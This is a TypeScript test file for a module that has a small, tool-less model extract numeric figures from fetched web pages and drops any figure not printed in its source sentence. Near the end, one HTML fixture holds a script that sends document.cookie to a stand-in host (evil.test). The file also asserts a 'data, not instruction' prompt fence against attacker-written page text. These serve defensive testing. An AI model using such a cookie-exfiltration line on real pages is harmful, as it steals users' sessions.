import assert from "node:assert/strict";
import {test} from "node:test";
import {
  FIGURE_MODEL,
  MAX_FIGURES,
  MAX_PAGE_CHARS,
  figurePrompt,
  figureQueryOptions,
  keepSourcedFigures,
  parseFigures,
  valueAppearsIn,
  type Figure,
} from "./figures.ts";
import {pageText} from "./research.ts";

const figure = (overrides: Partial<Figure> = {}): Figure => ({
  statement: "Marketing budgets sat at 7.7% of company revenue in 2024.",
  attribution: "CMO Survey, 2024",
  value: 7.7,
  unit: "%",
  context: "Marketing budgets plateaued at 7.7% of company revenue, down from 9.1% a year earlier.",
  ...overrides,
});

test("the extraction model is a small one", () => {
  // Mirrors label.test.ts. Asserted because the whole argument for this module is that
  // finding the sentence with the number in it does not need a frontier model, and a silent
  // swap upward would make a per-page call expensive enough to stop using.
  assert.match(FIGURE_MODEL, /haiku/);
});

test("the extractor gets no tools at all", () => {
  const options = figureQueryOptions();
  // `tools: []` is the control, and it is NOT `allowedTools`. The SDK's own doc comment says
  // allowedTools is an auto-approve list and that restricting what exists means `tools` — so
  // a model reading attacker-authored web text holds nothing here either way.
  assert.deepEqual(options.tools, []);
  assert.deepEqual(options.allowedTools, []);
  // No user CLAUDE.md, no hooks, no MCP servers. This is a subroutine, not a session.
  assert.deepEqual(options.settingSources, []);
  // Measured, not stylistic: with thinking on, one 25k-character page billed $0.105 — nineteen
  // thousand output tokens for two thousand tokens of answer. Copying sentences out of a page
  // is not a task with anything to deliberate about.
  assert.deepEqual(options.thinking, {type: "disabled"});
});

test("the prompt truncates the page and fences it", () => {
  const prompt = figurePrompt({url: "https://example.test/stats", text: "x".repeat(MAX_PAGE_CHARS * 3)});
  assert.ok(prompt.length < MAX_PAGE_CHARS + 2_000, `prompt was ${prompt.length} chars`);
  assert.match(prompt, /data, not instruction/);
  assert.match(prompt, /--- page text ---/);
});

test("parseFigures survives everything a model does instead of returning JSON", () => {
  // Never throws, by contract: a page that cannot be read is not a run that should stop.
  assert.equal(parseFigures("I could not find any figures on that page, sorry."), null);
  assert.equal(parseFigures("```json\n{not json at all}\n```"), null);
  assert.equal(parseFigures(""), null);
});

test("parseFigures accepts a fenced object and a bare array", () => {
  const one = figure();
  const fenced = parseFigures("Here you go:\n```json\n" + JSON.stringify({figures: [one]}) + "\n```");
  assert.equal(fenced?.length, 1);
  assert.equal(fenced?.[0]?.value, 7.7);
  // Haiku returns a bare array often enough that refusing one would throw away good work.
  assert.equal(parseFigures(JSON.stringify([one]))?.length, 1);
  // An empty list is a real answer — a page with no figures on it — not a failed read.
  assert.deepEqual(parseFigures(JSON.stringify({figures: []})), []);
});

test("one malformed figure costs that figure and no others", () => {
  // Was all-or-nothing, and a single over-long context sentence discarded the batch. Per-item
  // validation is the fix: a figure with no context is a number with nothing behind it, and
  // dropping it says nothing about the ones either side.
  const parsed = parseFigures(JSON.stringify({
    figures: [figure(), {statement: "no context here", value: 1}, figure({value: 9.1, context: "down from 9.1% a year earlier"})],
  }));
  assert.equal(parsed?.length, 2);
  assert.deepEqual(parsed?.map((entry) => entry.value), [7.7, 9.1]);
});

test("a reply cut off mid-figure keeps the figures that finished", () => {
  // The live failure, reproduced. Pointed at a Wikipedia article, Haiku enumerated numbers
  // until it ran out of output tokens and stopped inside a string — and the parse threw away
  // every intact figure along with the broken one, so the page reported zero figures. Which
  // reads as "nothing here", the most misleading answer available.
  const complete = JSON.stringify({figures: [figure(), figure({value: 402, unit: ""})]}, null, 2);
  // Two figures written, a third begun, and then the output budget ran out: no closing quote,
  // no closing brace, no closing bracket, and no closing fence either.
  const truncated = `\`\`\`json\n${complete.slice(0, complete.lastIndexOf("]"))},\n    {\n      "statement": "The video cost just $4500 to mak`;
  const parsed = parseFigures(truncated);
  assert.equal(parsed?.length, 2, "both complete figures survived the cut");
  assert.equal(parsed?.[1]?.value, 402);
});

test("a page full of numbers yields a usable list, not a truncated one", () => {
  // The other half of the same fix. The cap is stated in the prompt so the model stops, and
  // enforced here so an over-long reply is still readable rather than cut off mid-write.
  const many = Array.from({length: MAX_FIGURES + 8}, (_unused, index) =>
    figure({value: index + 1, unit: "", context: `Exactly ${index + 1} of them were counted.`}));
  assert.equal(parseFigures(JSON.stringify({figures: many}))?.length, MAX_FIGURES);
});

test("a brace inside a quoted sentence does not end the figure early", () => {
  // Context is page text, so it can contain anything — including JSON punctuation. Brace
  // counting that ignored strings would close this object at the wrong character.
  const parsed = parseFigures(JSON.stringify({
    figures: [figure({context: "The config {\"limit\": 7.7} shipped with 7.7% headroom, per the release note."})],
  }));
  assert.equal(parsed?.length, 1);
  assert.match(parsed?.[0]?.context ?? "", /limit/);
});

test("a figure whose number is not in its own sentence is dropped", () => {
  // The one that matters. "Roughly two thirds" paraphrased into 66 is an invented number
  // wearing a citation, which is the single thing this architecture exists to prevent — so it
  // is checked in code, not asked for in the prompt.
  const {kept, dropped} = keepSourcedFigures([
    figure(),
    figure({value: 66, unit: "%", context: "Roughly two thirds of teams said the same."}),
  ]);
  assert.equal(kept.length, 1);
  assert.equal(dropped.length, 1);
  assert.equal(dropped[0]?.value, 66);
});

test("a number is sourced when the page prints it, however it is punctuated", () => {
  assert.ok(valueAppearsIn(7.7, "plateaued at 7.7% of revenue"));
  assert.ok(valueAppearsIn(1200, "1,200 responses"), "thousands separators are the same claim");
  assert.ok(valueAppearsIn(1200, "1 200 Antworten"), "including a space, as German pages use");
  assert.ok(valueAppearsIn(3, "3.0 hours a week"), "3 and 3.0 are one figure written two ways");
  assert.ok(valueAppearsIn(2_400_000, "€2,400,000 in the first year"));
});

test("a scale word sources the number it scales", () => {
  // Measured on a real page, and the first version of this check got it wrong: every scaled
  // figure was dropped — "1.5 million readers", "$1 million by 1906", "108 million reviews" —
  // because the prompt asks for 2400000 from "2.4 million" and the check only looked for the
  // numeral. Prompt and control were contradicting each other.
  assert.ok(valueAppearsIn(1_500_000, "reaching 1.5 million readers in 40 countries"));
  assert.ok(valueAppearsIn(1_000_000, "sales rise to over $1 million by 1906"));
  assert.ok(valueAppearsIn(2_400_000, "2,4 Millionen Nutzer im ersten Jahr"), "German decimal comma");
  assert.ok(valueAppearsIn(3_000_000_000, "3 billion queries a day"));
  // The mantissa must be its own number. A greedy digit run would read this as "2016, 108" and
  // then fail — dropping a figure the page states plainly.
  assert.ok(valueAppearsIn(108_000_000, "ending the second quarter of 2016, 108 million reviews"));
  assert.ok(valueAppearsIn(12_000, "over 12 thousand people signed up"));
});

test("a scale word does not source a number it does not scale", () => {
  assert.ok(!valueAppearsIn(1_500_000, "reaching 1.5 billion readers"), "wrong scale");
  assert.ok(!valueAppearsIn(40_000_000, "in 40 countries"), "no scale word to apply");
  assert.ok(!valueAppearsIn(500_000, "reaching 1.5 million readers"), "a nearby number is not this one");
});

test("a number is not sourced by digits that happen to contain it", () => {
  // Substring matching would accept every one of these, and each is a different claim.
  assert.ok(!valueAppearsIn(7, "17 million users"), "7 is not sourced by 17");
  assert.ok(!valueAppearsIn(7, "grew 0.7 points"), "7 is not sourced by 0.7");
  assert.ok(!valueAppearsIn(20, "200 responses"), "20 is not sourced by 200");
  assert.ok(!valueAppearsIn(66, "roughly two thirds of teams"), "prose is not a numeral");
});

test("pageText drops script, style and svg bodies", () => {
  // Promoted from tidying to a control by this module: what survives here is what a model
  // reads. A script body is code an attacker chose, and a stylesheet is thousands of
  // characters of declarations that would eat the prompt budget before the prose is reached.
  const html = "<p>Budgets hit 7.7%.</p>"
    + "<script>fetch('https://evil.test/?c=' + document.cookie)</script>"
    + "<style>.a{color:#fff}</style>"
    + "<svg><path d='M0 0 L10 10'/></svg>";
  const text = pageText(html);
  assert.equal(text, "Budgets hit 7.7%.");
  for (const leak of ["evil.test", "document.cookie", "#fff", "M0 0"]) {
    assert.ok(!text.includes(leak), `${leak} reached the prompt`);
  }
});
